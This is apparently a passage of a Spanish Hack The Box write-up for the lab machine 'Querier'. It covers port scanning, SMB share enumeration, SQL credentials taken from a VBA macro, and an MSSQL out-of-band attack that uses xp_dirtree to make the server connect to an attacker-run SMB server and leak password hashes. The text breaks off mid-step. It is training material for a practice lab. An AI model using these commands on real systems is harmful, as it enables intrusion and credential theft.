yPPrA1UvXdyoWLr+woLOQIMrAnx5wyICUY1SLoArdaL1YbKDl3nn4LtMT97BNE0quTxDff0cPvQHxq5eRokGMKNBZtI6dhWWR+cxMKETCGlBLWw+rwlDfUS6Pt1z62gwYtitOrlJlWpZYEYrLNJLvLxlHS3JOKFIkGLUJZPOkDN8orlJxrxmVFOjZqnka5JZWpTZ0QRQQhjaBkUIOn0kjbEEdkZgRjWEpmAXBIV0BcOqMb+9BR2JZ9nYioapa7SHDFQEpXQN3/14IHPTPtJSwIrjexJfiIc0hIh7niR7J0A8IFEUiRmBSt5FNXTGkpIOoYIAz7Hvr6UaTZByYjCjU55x8D2fSsnH9n30sInrSRRFxBUQUgiwipLitE9x2sHQfKpFB80KM1wIMFbykZE6HNtCej5GczvDbpzUTRdTGpTzHk5F4lmSYs7Fc+T9v0cDmdU0pcnQqmTHQDYaVKIes+NFFtXnCSoF7vz+ODeMOpw1yyh4ScbOXCf1z7NEKg6B+BxGIq1MS50IYQJ2mKBZRdcFtu0VNDx5XaiiyaJAOFAkE5lhMOvQJWos6+mjNjBKPF9CT+fp2/kKE81t1P50jGZNwZU+BatAb7RMLmjQZuTplKvJUcL3QZFySPMt518k9C/cdguI+hRdH/ST7ZxPQVVZcnaQJZMTuIAfCdJzpR9jpkBHQMdBEJSS4foETrKRroDOqltj/L1+mHZZQBEqruOdUUy/dmjsZm06aVqcq0xTdiVd6RRe0OSD1auphIIY3fMpzm1gxc1BVv/lfeKqjxBQ1DWuJOuoOC7tgzeYTNQzHCrxcFcNz/Ysu2AfUsR3r/Xlc/afv/lUmLWxcc7EZjF3ZAStXCa3oJPbW59mZjLN2MAoytUblKdSKKUStqZxqrmJnBkgPDODmUpzRg2yqcOmo1HlYm95399O9Z8TAPbbn1urz46eSBdl9JVDCmtEgicSGvHsDOqVIYZGxnEAFbCAwKxZHO1eybVwCCyLxVeuMDSnlXCDz97t0BgX5cpY4Ynwzqs9CqAYL/VfqGQqP6lPauzZ7DHkpBg9dp7wsdNYI+OUARcoKQoF3UC3ayxWHBzXpWNggCHVJNzg8NY3oDGpUUlXd4d3Xu0BlPvAkYB1YMWbZlP4R6PTLnuPWNR6sizN5xHJJE2pFL7jYOJhIkmEw5xcMJ9r5RJz10X5wZcM6uIqVqq8J/it/+y5R8xPI1NYB5fvCtSHfnau3w0c7/Nwa5LlTTqxq1NYmRpIMJI6U7rJuBnEi+j8/DkTpCxYqfLu4IuXf/1ZyPwf6Du/XfbkuVF/a/ei0HeiSV0HcKXAcyVI0HQFpERVJCfOV0ZaY/4/Fsa8/WLHlY/+H/Q/KV9KhLt/yVMyYGxTdG2dB/OEIiISfKTMKr4cwPNOatXSH8X3rl+9W/eA138B5fYbT9EBj7QAAAAASUVORK5CYII=&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.125&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2570&#34;&gt;mrh4sh&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/2570&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;margin-top: -15px !important;margin-bottom: 5px !important;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/1190&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.7, 8.1, 5.7, 4.3, 1.9],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h1&gt;
&lt;p&gt;Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.125 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-02-19 05:54:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49665/tcp on 10.10.10.125                                 
Discovered open port 49666/tcp on 10.10.10.125                                 
Discovered open port 49670/tcp on 10.10.10.125                                 
Discovered open port 47001/tcp on 10.10.10.125                                 
Discovered open port 135/tcp on 10.10.10.125                                   
Discovered open port 49664/tcp on 10.10.10.125                                 
Discovered open port 5985/tcp on 10.10.10.125                                  
Discovered open port 49668/tcp on 10.10.10.125                                 
Discovered open port 49671/tcp on 10.10.10.125                                 
Discovered open port 139/tcp on 10.10.10.125 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Al realizar una busqueda de archivos y directorios en el &lt;code&gt;puerto 5985&lt;/code&gt; no encontramos nada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_181124.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;smbclient&#34;&gt;SMBCLIENT&lt;/h1&gt;
&lt;p&gt;Enumerando &lt;code&gt;SHARENAMES&lt;/code&gt; con smbclient encontramos &lt;code&gt;Reports&lt;/code&gt; e intentamos conectarnos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -L 10.10.10.125
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de &lt;code&gt;Reports&lt;/code&gt; econtramos un archivo xlsm el cual no contiene nada&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.125&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Reports

&lt;span class=&#34;s1&#34;&gt;&amp;#39;Currency Volume Report.xlsm&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;binwalk&#34;&gt;Binwalk&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_181033.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al utilizar &lt;code&gt;BinWalk&lt;/code&gt; para analizar el archivo en busqueda de archivos ocultos encontramos dentro del archivo un macro con el siguiente codigo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;c&#34;&gt;Rem Attribute VBA_ModuleType=VBADocumentModule
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Option&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;VBASupport&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;

&lt;span class=&#34;c&#34;&gt;&amp;#39; macro to pull data for client volume reports
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&amp;#39; further testing required
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;Private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Sub&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;Dim&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ADODB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;Dim&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ADODB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Recordset&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;New&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ADODB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConnectionString&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConnectionTimeout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Open&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;If&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;State&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;adStateOpen&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Then&lt;/span&gt;

  &lt;span class=&#34;c&#34;&gt;&amp;#39; MsgBox &amp;#34;connection successful&amp;#34;
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt; 
  &lt;span class=&#34;c&#34;&gt;&amp;#39;Set rs = conn.Execute(&amp;#34;SELECT * @@version;&amp;#34;)
&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;Set&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Execute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SELECT * FROM volume;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;Sheets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;A1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CopyFromRecordset&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;rs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Close&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;If&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;End&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Sub&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;microsoft-sql-server&#34;&gt;MICROSOFT SQL SERVER&lt;/h1&gt;
&lt;p&gt;Ya que tenemos credenciales para la base de datos procedemos a utilizar &lt;code&gt;mssqlclient.py&lt;/code&gt; el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por &amp;ldquo;default&amp;rdquo; en Microsoft SQL Server.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/&#34;&gt;&lt;strong&gt;SQL Server Database&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python mssqlclient.py -p &lt;span class=&#34;m&#34;&gt;1433&lt;/span&gt; -windows-auth -debug reporting:&lt;span class=&#34;s1&#34;&gt;&amp;#39;PcwTWTHRwryjc$c6&amp;#39;&lt;/span&gt;@10.10.10.125

SQL&amp;gt; SELECT name FROM master.dbo.sysdatabases
name                                                                                                                              
--------------------------------------------------------------------------------------------------------------------------------  
master                                                                                                                            
tempdb                                                                                                                            
model                                                                                                                             
msdb                                                                                                                              
volume
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;mssql-oob&#34;&gt;MSSQL OOB&lt;/h1&gt;
&lt;p&gt;Enumerando las diferentes bases de datos no encontramos ningun tipo de usuario y contraseña que nos pudiesen ayudar para conectarnos con otro usuario, asi mismo la ejecucion de comandos no esta permitida para nuestro usuario &lt;code&gt;reporting&lt;/code&gt;. Pero el usuario si esta permitido para ejecutar &lt;code&gt;xp_fileexist&lt;/code&gt; y &lt;code&gt;xp_dirtree&lt;/code&gt;, por lo que aprovechando estos podemos hacer Out-of-Band. Se utilizo smbserver.py de forma local para crear un &lt;code&gt;servidor samba&lt;/code&gt; y con mssqlclient.py se ejecuto el comando para hacer una &amp;lsquo;consulta&amp;rsquo; hacia nuestra maquina y asi obtener las contraseñas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; master..xp_fileexist &lt;span class=&#34;s1&#34;&gt;&amp;#39;\10.10.12.75\pwn&amp;#39;&lt;/span&gt; -- -
&lt;span class=&#34;nb&#34;&gt;declare&lt;/span&gt; @q varchar&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;99&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; @q&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.14.23\test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; master.dbo.xp_dirtree @q HTTP/1.1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;local&#34;&gt;LOCAL&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python smbserver.py -smb2support -port &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt; -ip 10.10.12.220 Me /tmp/me
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;remote&#34;&gt;REMOTE&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;EXEC MASTER.sys.xp_dirtree &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\10.10.12.220\Me&amp;#39;&lt;/span&gt;, 1, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
